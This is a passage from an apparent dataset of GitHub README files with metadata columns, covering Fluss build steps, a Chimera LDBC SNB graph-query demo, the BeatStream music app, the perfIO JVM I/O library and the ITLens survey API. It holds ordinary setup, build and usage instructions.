- Unix-like environment (we use Linux, Mac OS X, Cygwin, WSL)
- Git
- Maven (we require version >= 3.8.6)
- Java 8 or 11

```bash
git clone https://github.com/alibaba/fluss.git
cd fluss
mvn clean package -DskipTests
```

Fluss is now installed in `build-target`.

## Contributing

Fluss is open-source, and we‚Äôd love your help to keep it growing! Join the [discussions](https://github.com/alibaba/fluss/discussions),
open [issues](https://github.com/alibaba/fluss/issues) if you find a bug or request features, contribute code and documentation,
 or help us improve the project in any way. All contributions are welcome!

## License

Fluss project is licensed under the [Apache License 2.0](https://github.com/alibaba/fluss/blob/main/LICENSE).
",1,82,4,Apache-2.0,1,181.0,0.0,1.0,1.0,2.0,0.0,-0.15,1078.0
swstarlab-infolab/ldbc-complex-benchmark,master,"# Chimera LDBC SNB demonstration

This repository provides a demonstration of query processing over LDBC SNB. 

## LDBC SNB

The Linked Data Benchmark Council‚Äôs Social Network Benchmark ([LDBC SNB](https://ldbcouncil.org/benchmarks/snb/)) is a *de-facto* standard benchmark for graph-like data management technologies.
LDBC SNB is designed to be a plausible look-alike of all the aspects of operating a social network site, as one of the most representative and relevant use cases of modern graph-like applications.


## Data model in Chimera

Graph-Relational DBMS, Chimera can have two data models, Graph and Relational.
The following shows the LDBC SNB dataset in two data models.

### 1. Graph data model
<p align=""center"">
<img src=""https://github.com/swstarlab-infolab/ldbc-complex-benchmark/blob/master/img/Graph%20schema.png"" width=80%>
</p>

### 2. Relational data model
<p align=""center"">
<img src=""https://github.com/swstarlab-infolab/ldbc-complex-benchmark/blob/master/img/Relational%20schema.png"" width=100%>
</p>


## Query in Chimera

Chimera can process graph queries on top of a graph data model and relational queries on top of a relational data model.
It supports SQL, which is the standard for relational queries, and [Cypher](https://opencypher.org/), which is the most popular for graph queries, for which there is no standard yet.
It can also support hybrid queries that mix Cypher and SQL like [SQL/PGQ](https://www.iso.org/standard/79473.html?browse=tc).
The query below shows the Interactive Complex 2 (IC2) query with Cypher that shows the top 20 most recent messages created by friends of a particular person.

```sql
/* IC2. Recent messages by your friends
\set personId 933
\set maxDate '2010-10-16'
 */
SELECT personId,
    personFirstName,
    personLastName,
    postOrCommentId,
    postOrCommentContent,
    postOrCommentCreationDate
FROM cypher($$
MATCH (p:person)-[:person_knows_person]->(f:person)<-[:message_hascreator_person]-(m:message)
WHERE p.vertex_id = :personId AND m.creationdate < :maxDate
RETURN
    f.vertex_id AS personId,
    f.firstname AS personFirstName,
    f.lastname AS personLastName,
    m.vertex_id AS postOrCommentId,
    coalesce(m.content, m.imagefile) AS postOrCommentContent,
    m.creationdate AS postOrCommentCreationDate
ORDER BY
    m.creationdate DESC,
    m.vertex_id ASC
LIMIT 20
$$) as (
    personId bigint,
    personFirstName varchar,
    personLastName varchar,
    postOrCommentId bigint,
    postOrCommentContent text,
    postOrCommentCreationDate timestamp
);
```


## Client Interfaces in Chimera
Chimera is built on top of postgresql and supports all [postgresql-compatible client APIs](https://wiki.postgresql.org/wiki/List_of_drivers). 
The following shows a connection via the psql CLI as a representative example. 

<p align=""center"">
<img src=""https://github.com/swstarlab-infolab/ldbc-complex-benchmark/blob/master/img/psql%20CLI.png"" width=100%>
</p>


## Getting started
### 0. Requirements 

The recommended environment is that the benchmark scripts (Bash) and the LDBC driver (Java 8) run on the host machine, while the Chimera database runs in a Docker container. Therefore, the requirements are as follows:

* Bash
* Java 8
* Docker 19+
* postgresql-client


### 1. Setup

To clone a project with submodules, run: 

```bash
git clone --recurse-submodules git@github.com:swstarlab-infolab/ldbc-complex-benchmark.git
```

To install dependencies, run:

```bash
./setup/install_dependencies.sh
```


### 2. Loading the data
Setup scripts automatically loads dataset (for both graph and relational data models).
To load data with scale-factor 0.1 into the data-directory /mnt/disk1/ldbcsnb-demo, run

```bash
# loading for the first time
./scripts/setdb.sh init 0.1 /mnt/disk1/ldbcsnb-demo
# loaded previously 
./scripts/setdb.sh recycle 0.1 /mnt/disk1/ldbcsnb-demo
```

:warning: There should be enough space in the data-directory.


### 3. Querying the data
This demo supports IC2, IC4, IC8, IC12, IS1, IS3, IS4, and IS5 queries.
To run an IC2 query with psql, run: 

```bash
export PGPASSWORD=mysecretpassword
psql -h localhost -U postgres -d ldbcsnb -f queries/IC2.sql
```",0,0,1,BSD-2-Clause,0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,29.0
adelelawady/beat-stream,master,"

# üé∂ BeatStream

<div align=""center"">
  <img src=""https://github.com/user-attachments/assets/b83cf4a8-0c56-4943-8399-7bf039b4edba"" alt=""Release Image"" width=""150""/>
</div>






BeatStream is a powerful music streaming and management application built using **JHipster** and Java. It allows users to download tracks and playlists from popular platforms like YouTube, SoundCloud, and Spotify. BeatStream also lets you upload your own songs, create a personalized library of tracks and playlists, and manage your music collection seamlessly. üéß


[DOWNLOAD RELEASE 2 BETA ](https://github.com/adelelawady/beat-stream/releases/download/2.0.0.0/BeatStream.2.0.Beta.exe)


<div align=""center"">
  
  ### Overview of BeatStream üé∂
  <img width=""800"" alt=""Overview Screenshot"" src=""https://github.com/user-attachments/assets/9a7475d7-f5f6-4d3e-a629-b57a7176f8d3"">
  <br><br>

  ### Full Library Management üìö
  <img width=""800"" alt=""Library Management Screenshot"" src=""https://github.com/user-attachments/assets/ad1c80c1-2425-40d0-8c15-c76205b3e551"">
  <br><br>

  ### Download Progress Tracking üì•
  <img width=""800"" alt=""Download Tracking Screenshot"" src=""https://github.com/user-attachments/assets/b8acdb77-a9e0-43f2-b837-ff11231283d7"">
  
</div>

## Features


- üì• **Download Music:** Easily download tracks and playlists from YouTube ![youtube](https://github.com/user-attachments/assets/780e3019-56ed-43b5-aa62-c0d6ff2cf1c6), SoundCloud ![soundcloud](https://github.com/user-attachments/assets/dfdda467-e73f-4236-b8b3-f2a64dada9ee), and Spotify   <img src=""https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg"" alt=""Release Image"" width=""32""/>

- üì§ **Upload Your Own Songs:** Add your personal music tracks to your library.
- üìö **Library Management:** Create and manage a comprehensive library of songs and playlists.
- üìä **Download Tracking:** Keep track of your downloads, including their progress and status.
- üîÑ **Task Downloads:** Queue multiple downloads and manage them efficiently.
- üõ†Ô∏è **Powerful Tools:** Utilizes **yt-dl** for downloading, **ffmpeg** for audio processing, and **ChromeDriver** for web automation.

## Technologies Used

BeatStream is built using:

- **Java** for the backend.
- **Spring Boot** for building the application.
- **JHipster** for rapid development and scaffolding.
- **Angular** (if applicable) for the front end.
- **MongoDb** (or your preferred database) for data persistence.
- **electron** For Windows APP
- 
## Requirements

To run BeatStream, you will need:

- ‚òï Java Development Kit (JDK) 11 or later
- üé• **yt-dl:** A command-line program to download videos from YouTube and other sites.
- üéµ **ffmpeg:** A tool to handle multimedia files and streams.
- üåê **ChromeDriver:** For automating Chrome browser actions.
- **Node.js** and **npm**
- üê±‚Äçüèç **MongoDB:** Ensure that you have MongoDB running, as BeatStream uses it for data storage.

## Installation

1. üõ†Ô∏è **Clone the repository:**
   ```bash
   git clone https://github.com/adelelawady/beatstream.git
   cd beatstream
   ./mvnw
   ```

# Usage

üöÄ Access the application:
Open your web browser and navigate to http://localhost:8080.
üìñ Follow the on-screen instructions to download tracks, upload songs, and manage your library.

# API Documentation

For API documentation, visit http://localhost:8080/swagger-ui/.

# Contributing

ü§ù Contributions are welcome! If you have suggestions for improvements or new features, feel free to fork the repository and submit a pull request.

# License

üìù This project is licensed under the MIT License - see the LICENSE file for details.


> **Important Note on Spotify Downloads**:  
> The BeatStream app provides a **limited integration with Spotify** that allows users to download songs by **grabbing the song title from Spotify and searching for it on YouTube**.  
> - **Single-Track Limitation**: Downloads are currently limited to one song per request for any Spotify track.  
> - **Educational Use Only**: This functionality is designed for **educational and personal research purposes** only. BeatStream aims to serve as a **learning tool** for those interested in understanding how multimedia streaming technologies work, promoting digital literacy, and encouraging responsible, ethical use of software.
>

# beatStream

This application was generated using JHipster 8.7.1, you can find documentation and help at [https://www.jhipster.tech/documentation-archive/v8.7.1](https://www.jhipster.tech/documentation-archive/v8.7.1).

## Project Structure

Node is required for generation and recommended for development. `package.json` is always generated for a better development experience with prettier, commit hooks, scripts and so on.

In the project root, JHipster generates configuration files for tools like git, prettier, eslint, husky, and others that are well known and you can find references in the web.

`/src/*` structure follows default Java structure.

- `.yo-rc.json` - Yeoman configuration file
  JHipster configuration is stored in this file at `generator-jhipster` key. You may find `generator-jhipster-*` for specific blueprints configuration.
- `.yo-resolve` (optional) - Yeoman conflict resolver
  Allows to use a specific action when conflicts are found skipping prompts for files that matches a pattern. Each line should match `[pattern] [action]` with pattern been a [Minimatch](https://github.com/isaacs/minimatch#minimatch) pattern and action been one of skip (default if omitted) or force. Lines starting with `#` are considered comments and are ignored.
- `.jhipster/*.json` - JHipster entity configuration files

- `npmw` - wrapper to use locally installed npm.
  JHipster installs Node and npm locally using the build tool by default. This wrapper makes sure npm is installed locally and uses it avoiding some differences different versions can cause. By using `./npmw` instead of the traditional `npm` you can configure a Node-less environment to develop or test your application.
- `/src/main/docker` - Docker configurations for the application and services that the application depends on

## Development

### Doing API-First development using openapi-generator-cli

[OpenAPI-Generator]() is configured for this application. You can generate API code from the `src/main/resources/swagger/api.yml` definition file by running:

```bash
./mvnw generate-sources
```

Then implements the generated delegate classes with `@Service` classes.

To edit the `api.yml` definition file, you can use a tool such as [Swagger-Editor](). Start a local instance of the swagger-editor using docker by running: `docker compose -f src/main/docker/swagger-editor.yml up -d`. The editor will then be reachable at [http://localhost:7742](http://localhost:7742).

Refer to [Doing API-First development][] for more details.
The build system will install automatically the recommended version of Node and npm.

We provide a wrapper to launch npm.
You will only need to run this command when dependencies change in [package.json](package.json).

```
./npmw install
```

We use npm scripts and [Angular CLI][] with [Webpack][] as our build system.

Run the following commands in two separate terminals to create a blissful development experience where your browser
auto-refreshes when files change on your hard drive.

```
./mvnw
./npmw start
```

Npm is also used to manage CSS and JavaScript dependencies used in this application. You can upgrade dependencies by
specifying a newer version in [package.json](package.json). You can also run `./npmw update` and `./npmw install` to manage dependencies.
Add the `help` flag on any command to see how you can use it. For example, `./npmw help update`.

The `./npmw run` command will list all the scripts available to run for this project.

### PWA Support

JHipster ships with PWA (Progressive Web App) support, and it's turned off by default. One of the main components of a PWA is a service worker.

The service worker initialization code is disabled by default. To enable it, uncomment the following code in `src/main/webapp/app/app.config.ts`:

```typescript
ServiceWorkerModule.register('ngsw-worker.js', { enabled: false });
```

### Managing dependencies

For example, to add [Leaflet][] library as a runtime dependency of your application, you would run following command:

```
./npmw install --save --save-exact leaflet
```

To benefit from TypeScript type definitions from [DefinitelyTyped][] repository in development, you would run following command:

```
./npmw install --save-dev --save-exact @types/leaflet
```

Then you would import the JS and CSS files specified in library's installation instructions so that [Webpack][] knows about them:
Edit [src/main/webapp/app/app.config.ts](src/main/webapp/app/app.config.ts) file:

```
import 'leaflet/dist/leaflet.js';
```

Edit [src/main/webapp/content/scss/vendor.scss](src/main/webapp/content/scss/vendor.scss) file:

```
@import 'leaflet/dist/leaflet.css';
```

Note: There are still a few other things remaining to do for Leaflet that we won't detail here.

For further instructions on how to develop with JHipster, have a look at [Using JHipster in development][].

### Using Angular CLI

You can also use [Angular CLI][] to generate some custom client code.

For example, the following command:

```
ng generate component my-component
```

will generate few files:

```
create src/main/webapp/app/my-component/my-component.component.html
create src/main/webapp/app/my-component/my-component.component.ts
update src/main/webapp/app/app.config.ts
```

## Building for production

### Packaging as jar

To build the final jar and optimize the beatStream application for production, run:

```
./mvnw -Pprod clean verify -DskipTests
```

This will concatenate and minify the client CSS and JavaScript files. It will also modify `index.html` so it references these new files.
To ensure everything worked, run:

```
java -jar target/*.jar
```

Then navigate to [http://localhost:8080](http://localhost:8080) in your browser.

Refer to [Using JHipster in production][] for more details.

### Packaging as war

To package your application as a war in order to deploy it to an application server, run:

```
./mvnw -Pprod,war clean verify
```

### JHipster Control Center

JHipster Control Center can help you manage and control your application(s). You can start a local control center server (accessible on http://localhost:7419) with:

```
docker compose -f src/main/docker/jhipster-control-center.yml up
```

## Testing

### Spring Boot tests

To launch your application's tests, run:

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [src/test/javascript/](src/test/javascript/) and can be run with:

```
./npmw test
```

## Others

### Code quality using Sonar

Sonar is used to analyse code quality. You can start a local Sonar server (accessible on http://localhost:9001) with:

```
docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a database in a docker container, run:

```
docker compose -f src/main/docker/mongodb.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mongodb.yml down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

[JHipster Homepage and latest documentation]: https://www.jhipster.tech
[JHipster 8.7.1 archive]: https://www.jhipster.tech/documentation-archive/v8.7.1
[Using JHipster in development]: https://www.jhipster.tech/documentation-archive/v8.7.1/development/
[Using Docker and Docker-Compose]: https://www.jhipster.tech/documentation-archive/v8.7.1/docker-compose
[Using JHipster in production]: https://www.jhipster.tech/documentation-archive/v8.7.1/production/
[Running tests page]: https://www.jhipster.tech/documentation-archive/v8.7.1/running-tests/
[Code quality page]: https://www.jhipster.tech/documentation-archive/v8.7.1/code-quality/
[Setting up Continuous Integration]: https://www.jhipster.tech/documentation-archive/v8.7.1/setting-up-ci/
[Node.js]: https://nodejs.org/
[NPM]: https://www.npmjs.com/
[OpenAPI-Generator]: https://openapi-generator.tech
[Swagger-Editor]: https://editor.swagger.io
[Doing API-First development]: https://www.jhipster.tech/documentation-archive/v8.7.1/doing-api-first-development/
[Webpack]: https://webpack.github.io/
[BrowserSync]: https://www.browsersync.io/
[Jest]: https://facebook.github.io/jest/
[Leaflet]: https://leafletjs.com/
[DefinitelyTyped]: https://definitelytyped.org/
[Angular CLI]: https://cli.angular.io/

### Angular Core Libraries

- **@angular/common**: Core common utilities üåê, includes common directives like NgIf and NgFor, as well as pipes for handling dates, currency, and more.

- **@angular/compiler**: Essential for Angular template compilation üõ†Ô∏è, allowing HTML and Angular directives to render as interactive elements.

- **@angular/core**: The heart of Angular's framework üß©, including essential services and modules.

- **@angular/forms**: Handles forms and form validation üìù, managing both reactive and template-driven forms.

- **@angular/localize**: Localization support üåç, enabling the app to support multiple languages.

- **@angular/platform-browser** and **@angular/platform-browser-dynamic**: Provide DOM interactions üñ±Ô∏è and template compilation on the browser.

- **@angular/router**: Routing and navigation üß≠, handling URL routing for a single-page application structure.

### Capacitor Plugins

- **@capacitor/android**, **@capacitor/cli**, **@capacitor/core**, **@capacitor/ios**: Facilitate mobile functionality for both iOS and Android üì±, enabling native functionality access, like file storage, notifications, and more.

### FontAwesome Libraries

- **@fortawesome/angular-fontawesome**: Angular component library for FontAwesome icons üé®, allowing easy integration of scalable icons.

- **@fortawesome/fontawesome-svg-core** and **@fortawesome/free-solid-svg-icons**: Core FontAwesome SVG support üñºÔ∏è, providing a vast collection of icons for UI components.

### Translation and Localization

- **@ngx-translate/core**: Core translation module üåê, enabling dynamic translation handling.

- **@ngx-translate/http-loader**: Allows loading translation files via HTTP requests üìÇ, making it simple to manage and update language files.

### UI Frameworks

- **@ng-bootstrap/ng-bootstrap**: Integrates Bootstrap into Angular üñåÔ∏è, enabling styled components like modals, alerts, and accordions.

- **bootstrap** and **bootswatch**: Bootstrap library and themes üé®, providing pre-designed styles and UI components.

- **@popperjs/core** and **popper.js**: Handle positioning of tooltips and pop-ups üóÇÔ∏è, essential for creating interactive UI elements.

### File Handling

- **ngx-file-drop**: Allows drag-and-drop file upload functionality üì•, enabling users to upload files by dragging them into a specified area.

### Media Playback

- **ngx-plyr** and **plyr**: Video and audio player support üé∂, providing customizable and lightweight media player features.

### Utilities and Functional Libraries

- **dayjs**: Lightweight date library üóìÔ∏è, ideal for date and time manipulation.

- **jquery**: General DOM manipulation library ‚ú®, enhancing the functionality of traditional JavaScript.

- **rxjs**: Reactive programming support üîÑ, offering observables that handle asynchronous data streams.

- **tslib**: Utility library for TypeScript üîß, minimizing bundle size and supporting helper functions.

- **zone.js**: Execution context manager üîç, crucial for handling async operations and change detection in Angular.

### Infinite Scrolling

- **ngx-infinite-scroll**: Provides infinite scroll functionality üîÑ, enabling content to load dynamically as the user scrolls.

### WebSocket and Real-time Communication

- **@stomp/rx-stomp**: Manages STOMP messaging over WebSockets üîó, allowing real-time data communication.

- **sockjs-client**: Provides a WebSocket fallback üåê, maintaining connection stability even when WebSocket isn‚Äôt supported.
",1,1,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,325.0
szeiger/perfio,master,"# perfIO - Fast and Convenient I/O for the JVM

## Overview

perfIO provides buffered streaming I/O abstractions for both binary and text data. The design is optimized for performance. The public perfIO classes correspond roughly to the following standard library abstractions:

| perfIO                     | JDK (* and common 3rd-party additions)                                          |
|----------------------------|---------------------------------------------------------------------------------|
| BufferedInput              | BufferedInputStream, ByteArrayInputStream, DataInputStream, LimitedInputStream* |
| BufferedOutput             | BufferedOutputStream, DataOutputStream                                          |
| AccumulatingBufferedOutput | -                                                                               |
| PipeBufferedOutput         | PipeOutputStream                                                                |
| ArrayBufferedOutput        | ByteArrayOutputStream                                                           |
| LineTokenizer              | BufferedReader + InputStreamReader                                              |
| TextOutput                 | PrintWriter + BufferedWriter + OutputStreamWriter                               |

## How fast is it?

Reading and writing binary data using a sufficiently large buffer is faster than ByteBuffer, but with the full generality of streaming I/O that does not require a fixed buffer size. Data from the included benchmarks (measured on Temurin OpenJDK 22.0.2 on Linux x68-64) shows typical speed-ups between 3x and 40x in different scenarios compared to standard library abstractions for streaming I/O.

![1.svg](docs/1.svg)
![2.svg](docs/2.svg)
![3.svg](docs/3.svg)
![4.svg](docs/4.svg)
![5.svg](docs/5.svg)
![6.svg](docs/6.svg)

## What makes it fast?

Mostly avoiding things that make the JDK abstractions slow:

- InputStream and OutputStream use the decorator pattern. You typically use multiple nested streams that have to make all of their reads/writes through a standard set of methods that operate on individual bytes or byte arrays. You can easily end up with polymorphic dispatch (because you are always calling methods of the same interface with different implementations) and double buffering.

  By contrast, BufferedInput and BufferedOutput are built around a single buffer (byte array, ByteBuffer or MemorySegment) with a position and limit. All reads and writes are made directly to the buffer. There is no method dispatch overhead no matter how deeply nested the objects are. Almost all reads and writes (except the ones that require re-buffering) are done with a single range check plus increment. Any additional checks are pushed out of the inner loop into the buffering.

- None of the perfIO classes are synchronized or use any locking or memory fences. Streaming I/O is inherently sequential. Multi-threaded use requires synchronization at a higher level anyway, so we do not need to incur any performance penalties from synchronizing in the core abstractions.

- The JDK's Reader and Writer interfaces, as well as the NIO CharsetEncoders and CharsetDecoders are based on char arrays. This was fine at the time they were added, but nowadays the JVM uses a byte-based compact representation for all Strings which are valid Latin-1. In practice, most Strings contain ASCII text, so any char-based design requires conversions back and forth between byte arrays and char arrays.

  perfIO's TextOutput converts directly from Strings to byte data (writing it directly into a BufferedOutput's byte array) and LineTokenizer does the same when reading. This makes use of the more efficient conversions for the common character sets (UTF-8, Latin-1, ASCII) that are built into the String class, Unfortunately the provided API is not sufficient to avoid double buffering in all cases. perfIO can optionally call internal JDK methods to make some common use cases even faster. 

perfIO also uses both FFM and NIO abstractions where appropriate (depending on performance for the specific use case) and the Vector incubator API (for LineTokenizer).

Another source of performance is not just making the available abstractions fast, but making fast abstractions easily available:

- Reading large files is much faster with memory mapping. While you can always do the mapping manually using the NIO and FFM APIs for more control, perfIO makes the common use case a one-liner.

- Binary formats often use length-prefixed blocks. perfIO provides length-limited views for reading them (at essentially zero cost), and advanced buffer management for writing a length prefix after the content without double buffering or manual buffer management.

## Setup

Add the dependency to your project. Check the [Maven Central page](https://central.sonatype.com/artifact/com.novocode/perfio) for the latest versions and other dependency formats.

```
<dependency>
    <groupId>com.novocode</groupId>
    <artifactId>perfio</artifactId>
    <version>0.1.0</version>
</dependency>
```

The minimum required JDK version is 21 with `--enable-preview` (for the FFM API), or 22 without. There are no other dependencies.

- The Vector incubator API will be used automatically if it has been enabled with `--add-modules jdk.incubator.vector` and the JDK and CPU have appropriate support. Use of the Vector API can be disabled with `-Dperfio.disableVectorized=true`.

- JDK-internal String features will be used automatically if the `java.lang` package has been made accessible with `--add-opens java.base/java.lang=ALL-UNNAMED`. This can be disabled with `-Dperfio.disableStringInternals=true`.

- Unsafe memory access is disabled by default. It can improve the performance in some cases but result in less optimized code in others. Both `-Dperfio.enableUnsafe=true` and `--enable-native-access=ALL-UNNAMED` are required to enable it.

## Usage

A top-level `BufferedInput` or `BufferedOutput` object is instantiated by calling one of the static factory methods in the respective class. It should be closed after use by calling `close()`.

```java
  var out = BufferedOutput.ofFile(Path.of(""foo""));
  out.int8(1);
  out.int32(2);
  out.close();

  var in = BufferedInput.ofMappedFile(Path.of(""foo""));
  var a = in.int8();
  var b = in.int32();
  in.close();
```

Since Java does not have unsigned integers, the main methods for reading and writing binary data are the signed ones. The only exception is `uint16` which uses `char`, the only unsigned primitive type. Other `uint` methods are convenience wrappers that use a larger signed type.

| Method  | Width                  | Java Type (or surrogate) |
|---------|------------------------|--------------------------|
| int8    | 8 bits signed          | byte                     |
| uint8   | 8 bits unsigned        | (int)                    |
| int16   | 16 bits signed         | short                    |
| uint16  | 16 bits unsigned       | char                     |
| int32   | 32 bits signed         | int                      |
| uint32  | 32 bits unsigned       | (long)                   |
| int64   | 64 bits signed         | long                     |
| float32 | 32 bits floating-point | float                    |
| float64 | 64 bits floating-point | double                   |

The methods for reading and writing multi-byte numeric values require a byte order. Most factory methods set it to `BIG_ENDIAN` by default, but it can be changed at any time with the `order` method. This is consistent with `ByteBuffer` but different from the FFM API (which is mostly intended for interacting with native code and consequently uses the native byte order by default).

All methods except `int8` have additional variants ending in `n` (e.g. `int32n`), `b` and `l` for native, big endian and little endian byte order respectively. These methods are independent of the `BufferedInput`'s or `BufferedOutput`'s current byte order and slightly faster.

### Views

Both `BufferedInput` and `BufferedOutput` can have nested views, but the semantics are different. A `BufferedInput` is always read sequentially, thus creating a view at the current position (using the `limitedView` method) locks the parent until the view is closed. The only method that may still be called while a view is active is `close()` which implicitly closes all active nested views.

A `BufferedOutput` can be written to out of order. This is important for writing binary formats with length prefixes. It is often inconvenient or inefficient to calculate the length without actually writing the data. If the prefix has a fixed size, you can use `reserve` to insert a nested `BufferedOutput` at the current position which can be filled at a later point. You must write exactly the requested amount of data to it before closing it:

```java
  // Write a UTF-8 string with an int32 length prefix
  BufferedOutput b;
  var b2 = b.reserve(4);
  val pos0 = b.totalBytesWritten();
  b.string(...);
  var len = (int)(b.totalBytesWritten() - pos0);
  b2.int32(len);
  b2.close();
```

When the length of the prefix is variable, you can use `defer` instead. This method creates a `BufferedOutput` which shares its buffer management with the parent but is only inserted into the parent once it is closed. Note that this reverses the roles of the two buffers compared to `reserve`:

```java
  // Write a UTF-8 string with an int32 length prefix
  BufferedOutput b;
  val b2 = b.defer();
  b2.string(...);
  b.int32((int)b2.totalBytesWritten());
  b2.close();
```

Both `BufferedInput` and `BufferedOutput` will reuse views by default. This means that you should not access any view after closing it (unless it was explicitly detached by calling `detach()`) because the object and/or its buffer may have been repurposed. This design makes the repeated use of views for writing small amounts of data very efficient.

### Text I/O

A `LineTokenizer` can be obtained by calling `lines` on a `BufferedInput` object. It allows you to read a text file line by line. Line tokenization is currently limited to ASCII-compatible encodings, which includes UTF-8 and the ISO-8859 (""Latin"") charsets. `LineTokenizer` will use a faster SIMD-based implementation if the Vector API (incubator version as of JDK 22) is available.

A `TextOutput` can be obtained by calling `text` on a `BufferedOutput` object. It allows you to write text data, similar to `java.io.PrintWriter`. Unlike `LineTokenizer` it supports arbitrary character sets, but it is optimized for UTF-8, Latin-1 and ASCII.
",1,1,1,Apache-2.0,2,0.0,1.0,2.0,1.0,10.0,1.0,-2.8,0.0
hamzalamin/ITLens,main,"# Survey IT API Overview

**Survey IT** is a RESTful application built with **Spring Boot** that facilitates the creation, management, and participation in IT-focused surveys. The platform, **ITLens**, enables users to engage with structured surveys and view detailed statistical results of responses.


## üöÄ Features

- **Survey Management**: Create and manage surveys with hierarchical structures (Chapters ‚Üí Sub-Chapters ‚Üí Questions).
- **Question Types**: 
  - üìã **Single Choice Questions** 
  - üìù **Multiple Choice Questions**
- **Survey Participation**: Collect user responses for active surveys.
- **Results Analysis**: View statistical insights and percentage breakdowns of survey responses.

## üõ†Ô∏è Technical Stack

- **Backend**: Spring Boot, Spring Web (REST API), Spring Data JPA, Spring Validation, Spring Context
- **Database**: PostgreSQL
- **Documentation**: Swagger/OpenAPI
- **Testing**: JUnit 5, Mockito
- **Utilities**: Lombok, MapStruct (DTO Mapping), @RestControllerAdvice (Centralized Exception Handling)

## üß≥ Data Model

### Core Entities
#### **Survey**  
- `id`: Integer  
- `title`: String  
- `description`: String  
- `owner`: Owner (reference)

#### **SurveyEdition**  
- `id`: Integer  
- `creationDate`: Date  
- `startDate`: Date  
- `year`: Integer  
- `survey`: Survey (reference)

#### **Subject/Chapter**  
- `id`: Integer  
- `title`: String

#### **SubSubject/SubChapter**  
- `id`: Integer  
- `title`: String  
- `subject`: Subject (reference)

#### **Question**  
- `id`: Integer  
- `text`: String  
- `answerCount`: Integer  
- `type`: QuestionType (SINGLE_CHOICE, MULTIPLE_CHOICE)  
- `subSubject`: SubSubject (reference)

#### **Answer**  
- `id`: Integer  
- `text`: String  
- `selectionCount`: Integer  
- `question`: Question (reference)

#### **Owner**  
- `id`: Integer  
- `name`: String

# üí° Custom @Exist Annotation

The `@Exist` annotation is a custom validation annotation created to check whether a given entity exists in the database. This is particularly useful for validating foreign key relationships and ensuring data integrity before saving.

### Usage:
Simply annotate your DTO fields with `@Exist` to ensure that the related entity exists in the database.

Example:
```java
@NotNull @Positive @Exist(entity = Owner.class) Long ownerId
```

## üìÅ Project Structure

```plaintext
src/
‚îú‚îÄ‚îÄ main/
‚îÇ   ‚îú‚îÄ‚îÄ java/
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ com.wora.itlens/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ annotations/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ config/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ controllers/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ exceptions/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ mappers/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ models/
‚îÇ   ‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ dtos/
‚îÇ   ‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ entites/
‚îÇ   ‚îÇ       ‚îÇ   ‚îî‚îÄ‚îÄ enumes/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ repositories/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ validation/
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ ItLensApplication.java
‚îÇ   ‚îî‚îÄ‚îÄ resources/
‚îÇ       ‚îú‚îÄ‚îÄ static/
‚îÇ       ‚îú‚îÄ‚îÄ templates/
‚îÇ       ‚îú‚îÄ‚îÄ application.properties
‚îÇ       ‚îî‚îÄ‚îÄ application-test.properties
‚îî‚îÄ‚îÄ test/
    ‚îî‚îÄ‚îÄ java/
        ‚îî‚îÄ‚îÄ com.wora.itlens/

```
# üöÄ How to Get Started

### Prerequisites
Before running the application, make sure you have the following installed:
Java 17+
Maven
PostgreSQL database

### Setup Instructions
Clone the repository:
```plaintext
git clone https://github.com/hamzalamin/itLens/
```

Install the dependencies:
```plaintext
mvn install
```

Configure your database credentials:
```plaintext
spring.datasource.url=jdbc:postgresql://localhost:5432/your_database_name
spring.datasource.username=your_database_username
spring.datasource.password=your_database_password
```

# üåê API Documentation:
You can explore the API documentation using Swagger at:
http://localhost:8080/swagger-ui.html

# üìê Class Diagram:
![Class Diagram](https://github.com/hamzalamin/ITLens/blob/main/src/main/java/com/wora/itlens/classesDiagramme/classes.png)



",0,0,16,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,19.0
